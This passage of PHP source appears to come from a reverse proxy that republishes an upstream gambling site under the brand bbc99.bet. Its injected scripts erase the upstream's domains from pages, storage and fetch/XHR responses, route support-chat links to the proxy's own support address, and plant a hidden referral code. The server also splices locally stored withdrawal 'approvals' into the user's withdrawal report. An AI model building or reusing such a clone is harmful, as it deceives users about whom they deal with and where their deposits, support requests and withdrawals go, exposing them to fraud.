 * SPA keeps rendering even if the exact schema drifts.
 */
function applyWithdrawReport(string $body, string $contentType, string $path): string
{
    if ($body === '' || stripos($contentType, 'json') === false) {
        return $body;
    }
    if (stripos($path, 'WithdrawTransactionReport') === false && stripos($path, 'withdrawReport') === false) {
        return $body;
    }
    $sessionKey = requestSessionKey();
    if ($sessionKey === '') {
        return $body;
    }
    require_once __DIR__ . '/admin/store.php';
    $locals = withdraw_approvals_for_session($sessionKey);
    if (!$locals) {
        return $body;
    }
    $decoded = json_decode($body, true);
    if (!is_array($decoded)) {
        return $body;
    }
    // Locate the upstream list: value | value.list | value.records | value.data | value.items
    $listRef = null;
    $listKeys = [];
    if (isset($decoded['value']) && is_array($decoded['value'])) {
        if (array_keys($decoded['value']) === range(0, count($decoded['value']) - 1)) {
            $listRef = 'root';
        } else {
            foreach (['list', 'records', 'data', 'items'] as $k) {
                if (isset($decoded['value'][$k]) && is_array($decoded['value'][$k])) {
                    $listRef = $k;
                    break;
                }
            }
        }
    }
    if ($listRef === null) {
        return $body;
    }
    $template = null;
    if ($listRef === 'root') {
        $template = $decoded['value'][0] ?? null;
    } else {
        $template = $decoded['value'][$listRef][0] ?? null;
    }
    if (!is_array($template)) {
        return $body;
    }
    $statusMap = ['Pending' => 1, 'Approved' => 2, 'Rejected' => 3];
    $made = [];
    foreach ($locals as $it) {
        $st = (string) ($it['status'] ?? 'Pending');
        $row = $template;
        $amt = round((float) ($it['amount'] ?? 0), 2);
        foreach (['amount', 'withdrawAmount', 'applyAmount', 'money', 'orderAmount'] as $k) {
            if (array_key_exists($k, $row)) {
                $row[$k] = $amt;
            }
        }
        foreach (['status', 'statusId', 'orderStatus', 'state'] as $k) {
            if (array_key_exists($k, $row)) {
                $row[$k] = $statusMap[$st] ?? 1;
            }
        }
        foreach (['statusName', 'statusDesc', 'orderStatusName'] as $k) {
            if (array_key_exists($k, $row)) {
                $row[$k] = $st === 'Pending' ? 'Processing (awaiting admin)'
                    : ($st === 'Approved' ? 'Approved — please retry withdraw' : 'Rejected');
            }
        }
        foreach (['createTime', 'createdAt', 'applyTime', 'orderTime'] as $k) {
            if (array_key_exists($k, $row)) {
                $row[$k] = (string) ($it['createdAt'] ?? $row[$k]);
            }
        }
        $row['approvalStatus'] = $st;
        $row['localApproval'] = true;
        $row['localApprovalId'] = (int) ($it['id'] ?? 0);
        $made[] = $row;
    }
    if ($listRef === 'root') {
        $decoded['value'] = array_merge($made, $decoded['value']);
    } else {
        $decoded['value'][$listRef] = array_merge($made, $decoded['value'][$listRef]);
    }
    $encoded = json_encode($decoded, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    return $encoded === false ? $body : $encoded;
}

/**
 * Neutralise the app's affiliate sub-domain redirect. The entry script
 * /res/aboutMerchant.js sends e.g. lottogamez.gamer.free to
 * https://www.gamer.free/?affiliateCode=lottogamez, which breaks the proxy on
 * a sub-domain. When enabled, that redirect is disabled.
 */
function applyScriptPatches(string $body, string $path, string $contentType): string
{
    if (!DISABLE_AFFILIATE_REDIRECT || $body === '') {
        return $body;
    }
    if (!preg_match('#/res/aboutMerchant\.js$#i', (string) $path)) {
        return $body;
    }
    if (strpos($body, 'affiliateRedirect:!0') !== false) {
        return str_replace('affiliateRedirect:!0', 'affiliateRedirect:!1', $body);
    }
    // Fallback if the value was minified differently: neutralise the 3-label test.
    $patched = preg_replace('/3===w\.length&&!\/\^\(www\|preview\|sit\)\/\.test\(w\[0\]\)/', '!1', $body, 1);
    return $patched === null ? $body : $patched;
}

/**
 * Rewrite upstream fe_setting logo/favicon/app icon URLs inside HTML before serving.
 * web_logo/h5_logo -> logo, favicon -> favicon, desktop_app_logo +
 * merchant appdownloadicon -> local /img/web_app_icon.png.
 */
function applyContentHtml(string $html, array $content): string
{
    $logo = trim((string) ($content['logo']['url'] ?? ''));
    $favicon = trim((string) ($content['favicon']['url'] ?? ''));
    $appIcon = webAppIconUrl();
    if ($logo === '' && $favicon === '' && $appIcon === '') {
        return $html;
    }
    if ($logo !== '') {
        $html = preg_replace('#https?://[^"\'()\s]*/fe_setting/(?:web_logo|h5_logo)/[^"\'()\s]+#i', $logo, $html);
    }
    if ($favicon !== '') {
        $html = preg_replace('#https?://[^"\'()\s]*/fe_setting/favicon/[^"\'()\s]+#i', $favicon, $html);
    }
    if ($appIcon !== '') {
        $html = preg_replace('#https?://[^"\'()\s]*/fe_setting/desktop_app_logo/[^"\'()\s]+#i', $appIcon, $html);
        $html = preg_replace('#https?://[^"\'()\s]*/fe_setting/appdownloadicon/[^"\'()\s]+#i', $appIcon, $html);
        $html = preg_replace('#https?://[^"\'()\s]*/merchant_resource/appdownloadicon/[^"\'()\s]+#i', $appIcon, $html);
    }
    return $html;
}

/**
 * Runtime swap for rendered app icons the logo-swap misses: the notification /
 * download popup renders <img class="bottom-modal--icon" src="...appdownloadicon...">
 * (no "logo" in src/class, icon URL arrives via merchant API/localStorage).
 * Points any such img at the local /img/web_app_icon.png every 1.5s.
 */
function injectAppIconShim(string $html): string
{
    $script = <<<'HTML'
<script>(function(){var AI="/img/web_app_icon.png";function cls(el){try{var c=el.className;if(typeof c==="string")return c;if(c&&c.baseVal)return c.baseVal;}catch(e){}return "";}function bad(u){return typeof u==="string"&&(u.indexOf("appdownloadicon")!==-1||u.indexOf("desktop_app_logo")!==-1||(u.indexOf("3820949")!==-1&&u.indexOf("fe_setting")!==-1));}function swap(){try{var im=document.getElementsByTagName("img");for(var i=0;i<im.length;i++){var s=im[i].getAttribute("src")||"";var c=cls(im[i]);if(c.indexOf("bottom-modal--icon")!==-1||bad(s)){var cur=im[i].src||"";if(cur.indexOf(AI)===-1){im[i].setAttribute("src",AI);}}}}catch(e){}}function ready(f){if(document.readyState!=="loading")f();else document.addEventListener("DOMContentLoaded",f);}ready(function(){swap();setInterval(swap,1500);});})();</script>
HTML;
    if (preg_match('/<head[^>]*>/i', $html)) {
        return preg_replace('/(<head[^>]*>)/i', '$1' . $script, $html, 1);
    }
    return $script . $html;
}

/**
 * Inject a shim that removes any APK download links at runtime and routes
 * "download app" actions to the browser's PWA install flow (Chrome).
 */
function injectAppShim(string $html): string
{
    $script = <<<'HTML'
<script>(function(){
function pxToast(msg){try{var t=document.createElement("div");t.textContent=msg;
t.style.cssText="position:fixed;left:50%;bottom:24px;transform:translateX(-50%);z-index:2147483647;background:#111827;color:#fff;padding:12px 16px;border-radius:10px;font:600 14px system-ui,Segoe UI,Arial;box-shadow:0 10px 30px rgba(0,0,0,.4);max-width:90vw;text-align:center";
document.body.appendChild(t);setTimeout(function(){t.remove();},6000);}catch(e){}}
function pxInstall(){
if(window.__pxBip){try{window.__pxBip.prompt();var p=window.__pxBip;window.__pxBip=null;if(p&&p.userChoice)p.userChoice.then(function(){});}catch(e){}return;}
if(window.matchMedia&&window.matchMedia("(display-mode: standalone)").matches){return;}
pxToast('Open the Chrome menu and choose "Install app" or "Add to Home screen".');}
window.pxInstallApp=pxInstall;
window.addEventListener("beforeinstallprompt",function(e){e.preventDefault();window.__pxBip=e;});
var wo=window.open;window.open=function(u){try{if(typeof u==="string"&&/\.(apk|ipa)(\?|#|$)/i.test(u)){pxInstall();return null;}}catch(e){}return wo.apply(this,arguments);};
function isApk(u){return typeof u==="string"&&/\.(apk|ipa|mobileconfig)(\?|#|$)/i.test(u);}
function isAppBtn(el){try{var b=el&&el.closest?el.closest('.nav_item_btn,[class*="appdownload"],[class*="app-download"],[class*="downloadApp"],[class*="download-app"]'):null;if(!b)return false;var s=(b.className||"")+" "+(b.innerHTML||"");return /down|appdownload/i.test(s);}catch(e){return false;}}
document.addEventListener("click",function(e){
try{
var a=e.target&&e.target.closest?e.target.closest("a"):null;
if(a){var u=a.getAttribute("href")||"";
if(isApk(u)||(a.hasAttribute("download")&&/apk|app/i.test((a.textContent||"")+" "+(a.className||"")))){e.preventDefault();e.stopPropagation();pxInstall();return;}}
if(isAppBtn(e.target)){e.preventDefault();e.stopPropagation();pxInstall();}
}catch(err){}
},true);
function scan(){try{
var as=document.querySelectorAll("a[href]");
for(var i=0;i<as.length;i++){var h=as[i].getAttribute("href")||"";if(isApk(h)){as[i].setAttribute("data-px-apk","1");as[i].setAttribute("href","javascript:void(0)");}}
var qs=document.querySelectorAll(".qr-item,[class*='qr-item']");
for(var j=0;j<qs.length;j++){if(/android/i.test(qs[j].textContent||""))qs[j].style.display="none";}
}catch(err){}}
function ready(f){if(document.readyState!=="loading")f();else document.addEventListener("DOMContentLoaded",f);}
ready(scan);setInterval(scan,2000);})();</script>
HTML;

    if (preg_match('/<head[^>]*>/i', $html)) {
        return preg_replace_callback('/(<head[^>]*>)/i', function ($m) use ($script) {
            return $m[1] . $script;
        }, $html, 1);
    }
    return $script . $html;
}

/**
 * Inject a client-side watcher that catches in-app (SPA) navigations to the
 * voucher-center route and redirects them to the admin-configured custom page,
 * so no manual reload is needed. Mirrors the server-side redirect.
 */
function injectVoucherShim(string $html, array $voucher): string
{
    if (empty($voucher['enabled'])) {
        return $html;
    }
    $dest = trim(preg_replace('/[\r\n]+/', '', (string) ($voucher['redirect_url'] ?? '')));
    $src  = '/' . ltrim((string) ($voucher['path'] ?? '/m/voucherCenter'), '/');
    if ($dest === '' || $src === '/') {
        return $html;
    }
    $cfg = json_encode(
        ['src' => strtolower($src), 'dest' => $dest],
        JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT
    );
    $script = '<script>(function(){var C=' . $cfg . ';'
        . 'var src=C.src.replace(/\/+$/,"");'
        . 'function hit(){var p=(location.pathname||"").toLowerCase().replace(/\/+$/,"");'
        . 'if(src===""||p===src||p.slice(-src.length)===src){'
        . 'var d=C.dest,dc=d.replace(/^https?:\/\/[^\/]+/i,"").toLowerCase().replace(/\/+$/,"");'
        . 'if(p!==dc){location.replace(d);}}}'
        . 'try{["pushState","replaceState"].forEach(function(m){var o=history[m];'
        . 'history[m]=function(){var r=o.apply(this,arguments);setTimeout(hit,0);return r;};});}catch(e){}'
        . 'window.addEventListener("popstate",hit);window.addEventListener("hashchange",hit);'
        . 'function boot(){hit();setInterval(hit,400);}'
        . 'if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",boot);else boot();'
        . '})();</script>';
    if (preg_match('/<head[^>]*>/i', $html)) {
        return preg_replace_callback('/(<head[^>]*>)/i', function ($m) use ($script) {
            return $m[1] . $script;
        }, $html, 1);
    }
    if (stripos($html, '</body>') !== false) {
        return preg_replace('/<\/body>/i', $script . '</body>', $html, 1);
    }
    return $script . $html;
}

/**
 * Inject a fixed referral code into the site's registration flow by seeding
 * localStorage.reg_info (the value the app posts as `referralCode`). The code
 * never appears in the URL. localStorage.setItem is wrapped so the app's own
 * reg_info writes can't drop the code.
 */
function injectReferralShim(string $html): string
{
    $code = REFERRAL_CODE;
    $aff  = REFERRAL_AFFILIATE_CODE;
    if ($code === '' && $aff === '') {
        return $html;
    }
    $cfg = json_encode(
        ['code' => $code, 'aff' => $aff],
        JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES
            | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT
    );
    $script = '<script>(function(){var C=' . $cfg . ';if(!C.code&&!C.aff)return;'
        . 'function merge(v){var o;try{o=v?JSON.parse(v):{};}catch(e){o={};}'
        . 'if(!o||typeof o!=="object")o={};'
        . 'if(C.code)o.referralCode=C.code;if(C.aff)o.affiliateCode=C.aff;'
        . 'return JSON.stringify(o);}'
        . 'try{var ls=window.localStorage;'
        . 'ls.setItem("reg_info",merge(ls.getItem("reg_info")));'
        . 'var orig=ls.setItem;ls.setItem=function(k,v){if(k==="reg_info")v=merge(v);return orig.call(ls,k,v);};'
        . '}catch(e){}'
        . '})();</script>';
    if (preg_match('/<head[^>]*>/i', $html)) {
        return preg_replace_callback('/(<head[^>]*>)/i', function ($m) use ($script) {
            return $m[1] . $script;
        }, $html, 1);
    }
    return $script . $html;
}

/**
 * Inject a custom theme for the login / signup UI. Placed at the end of <head>
 * so it overrides the app's own styles. Edit the CSS variables below to recolour.
 */
function injectThemeShim(string $html): string
{
    $css = <<<'CSS'
<style id="px-login-theme">
:root{
  --pxl-bg1:#151b30; --pxl-bg2:#0b0f1c; --pxl-line:#2c375a;
  --pxl-text:#eef2ff; --pxl-muted:#9aa6c7;
  --pxl-grad:linear-gradient(135deg,#7c3aed,#2563eb);
  --pxl-grad-hover:linear-gradient(135deg,#8b5cf6,#3b82f6);
  --pxl-login:linear-gradient(135deg,#f59e0b,#ef4444);
  --pxl-glow:rgba(99,102,241,.45); --pxl-gold:#f5b301;
}
.v--modal-overlay{background:rgba(3,6,16,.72)!important;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px)}
.loginmodal-bg,.regs_bg{border-radius:20px!important;overflow:hidden!important;border:1px solid var(--pxl-line)!important;box-shadow:0 30px 90px rgba(0,0,0,.6)!important}
.register_wrapper,.form-popup-container .form-popup-bg{background:linear-gradient(165deg,var(--pxl-bg1),var(--pxl-bg2))!important}
.form-popup-container{border-radius:22px!important;overflow:hidden!important;box-shadow:0 30px 90px rgba(0,0,0,.6)!important}
.form-popup-container .form-popup-bg{border:1px solid var(--pxl-line)!important;border-radius:0 22px 22px 0!important}
.form-popup-container .form-popup-banner{border-radius:22px 0 0 22px!important}
.register_wrapper::-webkit-scrollbar-thumb,.form-popup-bg::-webkit-scrollbar-thumb{background:var(--pxl-grad)!important}
.register-title__text,.form-title,.form-title__text,.form-title h5{color:var(--pxl-text)!important}
.form-title span{border-bottom:2px solid var(--pxl-gold)!important}
.form-title a{color:var(--pxl-muted)!important}
.method-select{color:var(--pxl-muted)!important;text-shadow:none!important}
.method-select .active.method-item{background:var(--pxl-grad)!important;color:#fff!important;border-radius:12px!important;box-shadow:0 8px 20px var(--pxl-glow)!important}
.item_box{background:rgba(255,255,255,.05)!important;border:1px solid var(--pxl-line)!important;border-radius:12px!important;transition:border-color .2s,box-shadow .2s!important}
.item_box:hover,.item_box:focus-within{border-color:#6366f1!important;box-shadow:0 0 0 3px var(--pxl-glow)!important}
.form_item .item_box>input,.hd_login .form_item .item_box>input,.hd_login .form_item .item_box.hasIcon>input{background:transparent!important;color:var(--pxl-text)!important;border-radius:12px!important}
.form_item .item_box>input:focus{border-color:#6366f1!important;box-shadow:0 0 0 3px var(--pxl-glow)!important}
.form_item .item_box>input::placeholder,.hd_login .form_item .item_box>input::placeholder{color:var(--pxl-muted)!important}
.label-text,.label-box{color:var(--pxl-muted)!important}
.input_icon,.item-icon{color:var(--pxl-muted)!important}
.form_item .submit_btn,.form-popup-container .submit_btn,.register_wrapper .submit_btn,.hd_login .submit_btn,.hd_login .register-btn,.hd_login .free-btn{background:var(--pxl-grad)!important;border:0!important;border-radius:12px!important;color:#fff!important;box-shadow:0 12px 26px var(--pxl-glow)!important;transition:.2s!important}
.form_item .submit_btn:hover,.form-popup-container .submit_btn:hover,.register_wrapper .submit_btn:hover,.hd_login .submit_btn:hover,.hd_login .register-btn:hover{background:var(--pxl-grad-hover)!important;box-shadow:0 16px 34px var(--pxl-glow)!important;transform:translateY(-1px)}
.form_item .submit_btn.login-btn,.form-popup-container .submit_btn.login-btn,.register_wrapper .submit_btn.login-btn,.hd_login .submit_btn.login-btn{background:var(--pxl-login)!important;border:0!important;box-shadow:0 12px 26px rgba(239,68,68,.35)!important}
.form-btn{background:transparent!important;color:#fff!important;border:0!important;border-radius:12px!important}
.form_item .sms-btn,.hd_login .form_item .sms-btn{background:var(--pxl-grad)!important;border-radius:10px!important;box-shadow:0 6px 16px var(--pxl-glow)!important}
.form_item .sms-btn:hover{background:var(--pxl-grad-hover)!important}
p.errorMsg,.form_item .errorMsg{color:#fca5a5!important}
/* mobile login / signup: remove the Home / Register / Reset / Services cards */
.login_wrap .form-bottom-container,.register_wrap .form-bottom-container{display:none!important}
</style>
CSS;
    if (stripos($html, '</head>') !== false) {
        return preg_replace('/<\/head>/i', $css . '</head>', $html, 1);
    }
    return $css . $html;
}

/**
 * Inject admin-managed content: title, logo, marquee and banners.
 */
function injectContentShim(string $html, array $content): string
{
    $titles = $content['titles'] ?? [];
    $logo = $content['logo'] ?? [];
    $favicon = $content['favicon'] ?? [];
    $marquee = $content['marquee'] ?? [];
    if (($titles['web_title'] ?? '') === '' && ($logo['url'] ?? '') === ''
        && ($favicon['url'] ?? '') === '' && empty($marquee['enabled'])) {
        return $html;
    }

    $cfg = json_encode([
        'titles'  => ['web_title' => $titles['web_title'] ?? ''],
        'logo'    => ['url' => $logo['url'] ?? '', 'width' => (int) ($logo['width'] ?? 0)],
        'favicon' => ['url' => $favicon['url'] ?? ''],
        'marquee' => [
            'enabled' => !empty($marquee['enabled']),
            'items'   => array_values(array_map(function ($it) {
                return ['text' => (string) ($it['text'] ?? ''), 'link' => (string) ($it['link'] ?? '')];
            }, array_filter($marquee['items'] ?? [], 'is_array'))),
            'text'    => $marquee['text'] ?? '',
            'link'    => $marquee['link'] ?? '',
            'bg'      => $marquee['bg'] ?? '#111827',
            'color'   => $marquee['color'] ?? '#ffffff',
            'speed'   => max(20, (int) ($marquee['speed'] ?? 160)),
        ],
    ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);

    $script = '<script>(function(){var C=' . $cfg . ';'
        . 'function ready(f){if(document.readyState!=="loading")f();else document.addEventListener("DOMContentLoaded",f);}'
        . 'var T=C.titles||{},L=C.logo||{},F=C.favicon||{},M=C.marquee||{};'
        . 'if(T.web_title){var st=function(){if(document.title!==T.web_title)document.title=T.web_title;'
        . 'var e=document.getElementsByTagName("title")[0];if(e&&e.textContent!==T.web_title)e.textContent=T.web_title;};ready(st);setInterval(st,1200);}'
        . 'if(L.url){var sw=function(){var im=document.getElementsByTagName("img");for(var i=0;i<im.length;i++){'
        . 'var s=(im[i].getAttribute("src")||"")+" "+(im[i].className||"");if(/logo/i.test(s)&&im[i].src!==L.url){im[i].src=L.url;'
        . 'if(L.width>0){im[i].style.maxWidth=L.width+"px";im[i].style.height="auto";}}};};ready(sw);setInterval(sw,1500);}'
        . 'if(F.url){var fv=function(){if(document.getElementById("px-favicon"))return;'
        . 'var ls=document.querySelectorAll("link[rel*=\'icon\']");for(var i=0;i<ls.length;i++){if(ls[i].id!=="px-favicon"&&ls[i].parentNode)ls[i].parentNode.removeChild(ls[i]);}'
        . 'var l=document.createElement("link");l.id="px-favicon";l.rel="icon";l.href=F.url;document.head.appendChild(l);};ready(fv);setInterval(fv,3000);}'
        . 'if(M.enabled){var IT=(M.items&&M.items.length)?M.items:((M.text)?[{text:M.text,link:M.link||""}]:[]);'
        . 'ready(function(){var st=document.createElement("style");'
        . 'st.textContent=".notice_main,.marquee_box,.marquee-bar,.marquee-content,.notice_list{background:"+M.bg+" !important;color:"+M.color+" !important;}.notice_list li{color:"+M.color+" !important;}";'
        . 'document.head.appendChild(st);var pps=M.speed>0?M.speed:90;'
        . 'var applySpeed=function(){var cs=document.querySelectorAll(".marquee-content");var vw=window.innerWidth||0;for(var i=0;i<cs.length;i++){var w=cs[i].scrollWidth||0;var dist=w+0.67*vw;if(dist>0)cs[i].style.setProperty("animation-duration",(dist/pps)+"s","important");}};'
        . 'var setTxt=function(){if(!IT.length)return;var ls=document.querySelectorAll(".notice_list");for(var j=0;j<ls.length;j++){var cur=ls[j].querySelectorAll("li");var bad=cur.length!==IT.length;if(!bad){for(var m=0;m<IT.length;m++){if((cur[m].textContent||"")!==IT[m].text){bad=true;break;}}}if(bad){ls[j].innerHTML="";for(var k=0;k<IT.length;k++){var n=document.createElement("li");n.textContent=IT[k].text;ls[j].appendChild(n);}}}};'
        . 'var bind=function(){var ns=document.querySelectorAll(".notice_list li");for(var i=0;i<ns.length;i++){if(ns[i].getAttribute("data-px-mq"))continue;ns[i].setAttribute("data-px-mq","1");var it=IT[i%IT.length]||{};if(it.link){ns[i].style.cursor="pointer";(function(el,lk){el.addEventListener("click",function(ev){ev.stopPropagation();window.open(lk,"_blank");});})(ns[i],it.link);}}};'
        . 'applySpeed();setTxt();bind();setInterval(function(){applySpeed();setTxt();bind();},1500);});}'
        . '})();</script>';

    if (preg_match('/<head[^>]*>/i', $html)) {
        return preg_replace_callback('/(<head[^>]*>)/i', function ($m) use ($script) {
            return $m[1] . $script;
        }, $html, 1);
    }
    if (stripos($html, '</body>') !== false) {
        return preg_replace('/<\/body>/i', $script . '</body>', $html, 1);
    }
    return $script . $html;
}

/**
 * Prevent frontend "internet off" overlay when upstream is slow.
 * Does not mock login data — only suppresses offline UI.
 */
function injectInviteShim(string $html): string
{
    $script = '<script>(function(){var h=location.host;function f(s){if(typeof s!=="string")return s;return s.replace(/133bet22\.com/gi,h).replace(/1333bet\.ai/gi,h).replace(/bbc9922\.com/gi,h).replace(/1333bk\.com/gi,h).replace(/1333bet\d+\.com/gi,h).replace(/[a-z0-9-]*lotto[a-z0-9-]*\.[a-z0-9.\-]+/gi,h).replace(/[a-z0-9-]+\.gamer\.free/gi,h).replace(/https?:\/\/[^\'\"()\s]*\/merchant_resource\/appdownloadicon\/[^\'\"()\s]*/gi,"https://"+h+"/img/web_app_icon.png").replace(/https?:\/\/[^\'\"()\s]*\/fe_setting\/(?:desktop_app_logo|appdownloadicon)\/[^\'\"()\s]*/gi,"https://"+h+"/img/web_app_icon.png").replace(/https?:\/\/[^\'\"()\s]*(?:open_chat\.cgi|live-?chat|live800|miduoke|aican|udesk|qiyukf|easemob|tawk\.to|crisp\.chat|meiqia|kf5|53kf|customer-?service|online-?service|chatlink|mqqwpa|bizqq|kefu|live-?help|support-?chat|chat-?support)[^\'\"()\s]*/gi,"https://support.bbc99.bet");}function sweepStorage(){try{for(var si=0;si<localStorage.length;si++){var sk=localStorage.key(si);var sv=localStorage.getItem(sk);if(typeof sv==="string"&&(sv.indexOf("appdownloadicon")!==-1||sv.indexOf("desktop_app_logo")!==-1||sv.indexOf("133bet22")!==-1||sv.indexOf("1333bet")!==-1||sv.indexOf("1333bk")!==-1||sv.indexOf("bbc9922")!==-1||sv.indexOf("gamer.free")!==-1||sv.toLowerCase().indexOf("lotto")!==-1)){var nv=f(sv);if(nv!==sv){try{localStorage.setItem(sk,nv);}catch(e){}}}}catch(e){}}function hasSup(u){return typeof u==="string"&&/open_chat\.cgi|live-?chat|live800|miduoke|aican|udesk|qiyukf|easemob|tawk\.to|crisp\.chat|meiqia|kf5|53kf|customer-?service|online-?service|chatlink|mqqwpa|bizqq|kefu|live-?help|support-?chat|chat-?support/i.test(u);}function scan(){try{var b=document.body;if(!b)return;document.querySelectorAll("input").forEach(function(i){if(i.value&&((i.value.indexOf("133bet22")!==-1)||(i.value.indexOf("1333bet")!==-1)||(i.value.indexOf("bbc9922")!==-1)||(i.value.indexOf("1333bk")!==-1)||(i.value.toLowerCase().indexOf("lotto")!==-1)||(i.value.indexOf("gamer.free")!==-1)))i.value=f(i.value);});var w=document.createTreeWalker(b,NodeFilter.SHOW_TEXT,null,false),n;while(n=w.nextNode()){if(n.nodeValue&&((n.nodeValue.indexOf("133bet22")!==-1)||(n.nodeValue.indexOf("1333bet")!==-1)||(n.nodeValue.indexOf("bbc9922")!==-1)||(n.nodeValue.indexOf("1333bk")!==-1)||(n.nodeValue.toLowerCase().indexOf("lotto")!==-1)||(n.nodeValue.indexOf("gamer.free")!==-1)))n.nodeValue=f(n.nodeValue);}var els=document.querySelectorAll("a[href]");els.forEach(function(a){if(a.href&&((a.href.indexOf("133bet22")!==-1)||(a.href.indexOf("1333bet")!==-1)||(a.href.indexOf("bbc9922")!==-1)||(a.href.indexOf("1333bk")!==-1)||(a.href.toLowerCase().indexOf("lotto")!==-1)||(a.href.indexOf("gamer.free")!==-1)||hasSup(a.href)))a.href=f(a.href);});}catch(e){}}if(window.fetch){var of=window.fetch;window.fetch=function(u,o){return of(u,o).then(function(r){var ct=(r.headers.get("content-type")||"").toLowerCase();if(ct.indexOf("json")!==-1)return r.clone().text().then(function(t){if(t.indexOf("133bet22")!==-1||t.indexOf("1333bet")!==-1||t.indexOf("bbc9922")!==-1||t.indexOf("1333bk")!==-1||t.toLowerCase().indexOf("lotto")!==-1||t.indexOf("gamer.free")!==-1||hasSup(t)){var nt=f(t);return new Response(nt,{status:r.status,statusText:r.statusText,headers:r.headers});}return new Response(t,{status:r.status,statusText:r.statusText,headers:r.headers});});return r;});}}var oOpen=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(){var xhr=this;var origDesc=Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype,"responseText");try{Object.defineProperty(xhr,"_raw",{writable:true,value:""});xhr.addEventListener("load",function(){try{if(xhr.responseText&&((xhr.responseText.indexOf("133bet22")!==-1)||(xhr.responseText.indexOf("1333bet")!==-1)||(xhr.responseText.indexOf("bbc9922")!==-1)||(xhr.responseText.indexOf("1333bk")!==-1)||(xhr.responseText.toLowerCase().indexOf("lotto")!==-1)||(xhr.responseText.indexOf("gamer.free")!==-1)||hasSup(xhr.responseText))){Object.defineProperty(xhr,"responseText",{get:function(){return f(xhr._raw);}});Object.defineProperty(xhr,"response",{get:function(){return f(xhr._raw);}});}}catch(e){}});}catch(e){}return oOpen.apply(this,arguments);};document.addEventListener("DOMContentLoaded",function(){scan();sweepStorage();setInterval(scan,1200);setInterval(sweepStorage,4000);try{new MutationObserver(scan).observe(document.body,{childList:true,subtree:true,characterData:true});}catch(e){}});})();</script>';
    if (preg_match('/<head[^>]*>/i', $html)) {
        return preg_replace_callback('/(<head[^>]*>)/i', function ($m) use ($script) {
            return $m[1] . $script;
        }, $html, 1);
    }
    return $script . $html;
}

function injectOfflineShim(string $html): string
{
    $script = '<script>(function(){try{Object.defineProperty(navigator,"onLine",{get:function(){return true},configurable:true});}catch(e){}window.addEventListener("offline",function(e){e.stopImmediatePropagation();e.preventDefault();},true);var s=document.createElement("style");s.textContent=".offline-overlay,.network-error,.no-internet,.internet-off{display:none!important}";document.addEventListener("DOMContentLoaded",function(){try{document.head.appendChild(s);}catch(e){}});})();</script>';
    if (preg_match('/<head[^>]*>/i', $html)) {
        return preg_replace_callback('/(<head[^>]*>)/i', function ($m) use ($script) {
            return $m[1] . $script;
        }, $html, 1);
    }
    return $script . $html;
}

/**
 * Inject a tiny script that prefixes root-absolute same-origin requests
 * with the proxy base path, so /wps and /lgw calls reach this proxy.
 */
function injectBaseShim(string $html, string $base): string
{
    if ($base === '') {
        return $html;
    }
    $baseJson = json_encode($base);
    $script = '<base href="' . htmlspecialchars($base, ENT_QUOTES) . '/">'
        . '<script>(function(){var b=' . $baseJson . ';'
        . 'function f(u){if(typeof u!=="string"||u.charAt(0)!=="/"||u.charAt(1)==="/")return u;'
        . 'if(u===b||u.indexOf(b+"/")===0)return u;return b+u;}'
        . 'var o=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){'
        . 'try{arguments[1]=f(u);}catch(e){}return o.apply(this,arguments);};'
        . 'if(window.fetch){var wf=window.fetch;window.fetch=function(i,n){'
        . 'try{if(typeof i==="string")i=f(i);else if(i&&i.url)i=new Request(f(i.url),i);}catch(e){}'
        . 'return wf.call(this,i,n);};}'
        . '})();</script>';

    if (preg_match('/<head[^>]*>/i', $html)) {
        return preg_replace_callback('/(<head[^>]*>)/i', function ($m) use ($script) {
            return $m[1] . $script;
        }, $html, 1);
    }
    return $script . $html;
}

/**
 * SEO for Google indexing (homepage `/` focus).
 * - Self-canonical + robots index,follow + absolute og:url/image (all HTML).
 * - Visible unique Bengali H1/text/FAQ + JSON-LD + noscript (homepage only),
 *   so Google sees crawlable text without JS and no duplicate-content filter
 *   from the proxied upstream shell (<div id=app></div>).
 */
function injectSeoShim(string $html, string $path, array $content): string
{
    $rawPath = parse_url($path, PHP_URL_PATH) ?: $path;
    if ($rawPath === '' || $rawPath === false) {
        $rawPath = '/';
    }
    $pLower = strtolower($rawPath);
    $isHome = ($pLower === '/' || $pLower === '' || $pLower === '/index.php');

    $host = strtolower(preg_replace('/:\d+$/', '', (string) ($_SERVER['HTTP_HOST'] ?? 'bbc99.bet')));
    if ($host === '') {
        $host = 'bbc99.bet';
    }
    $isLocal = (strpos($host, 'localhost') === 0 || strpos($host, '127.') === 0 || strpos($host, '192.168.') === 0 || $host === '::1' || strpos($host, '10.') === 0 || strpos($host, '172.') === 0 || substr($host, -6) === '.local' || substr($host, -5) === '.test');
    // Single apex canonical for prod (no www split); dynamic host only for local dev.
    if ($host === 'www.bbc99.bet' || $host === 'bbc99.bet') {
        $scheme = 'https';
        $canonHost = 'bbc99.bet';
    } elseif ($isLocal) {
        $scheme = 'http';
        $canonHost = $host;
    } else {
        $scheme = 'https';
        $canonHost = $host;
    }
    $canonUrl = $scheme . '://' . $canonHost . '/'; // all proxy shells consolidate on apex (SPA duplicates)
    $brand = BRAND_TO !== '' ? BRAND_TO : 'BBC99';
    $titles = $content['titles'] ?? [];
    $siteName = trim((string) ($titles['app_name'] ?? ''));
    if ($siteName === '') {
        $siteName = $brand;
    }

    // 1. robots -> single index,follow (strip any upstream dups first).
    $html = preg_replace('/<meta\s+[^>]*name=(["\']?)robots\1[^>]*>\s*/i', '', $html);
    if (preg_match('/<meta\s+charset[^>]*>/i', $html)) {
        $html = preg_replace('/(<meta\s+charset[^>]*>)/i', '$1' . "\n" . '<meta name="robots" content="index,follow">', $html, 1);
    } elseif (preg_match('/<head[^>]*>/i', $html)) {
        $html = preg_replace('/(<head[^>]*>)/i', '$1' . "\n" . '<meta name="robots" content="index,follow">', $html, 1);
    } else {
        $html = '<meta name="robots" content="index,follow">' . "\n" . $html;
    }

    // 2. canonical -> single apex self (strip dups; no split / vs /index.php).
